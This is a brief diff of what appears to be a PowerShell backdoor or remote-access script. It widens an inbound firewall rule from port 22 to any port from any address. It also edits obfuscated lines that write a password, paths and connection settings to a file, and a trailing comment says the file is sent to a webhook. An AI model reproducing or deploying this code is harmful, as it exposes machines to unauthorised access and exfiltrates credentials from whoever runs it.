@@ -86,7 +86,7 @@ try {
       -Enabled True `
       -Direction Inbound `
       -Protocol TCP `
-      -LocalPort 22 `
+      -LocalPort any `
       -RemoteAddress Any `
       -Profile Any `
       -Action Allow
@@ -120,7 +120,7 @@ Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
 Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
 Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
 Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
-Add-Content -Path $CRYnrkaDbe -Value "22" -Force # SSH PORT - MUST BE 22 FOR LOCAL CONNECTIONS
+Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # SSH PORT - MUST BE 22 FOR LOCAL CONNECTIONS
 Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type
 
 # send file to webhook
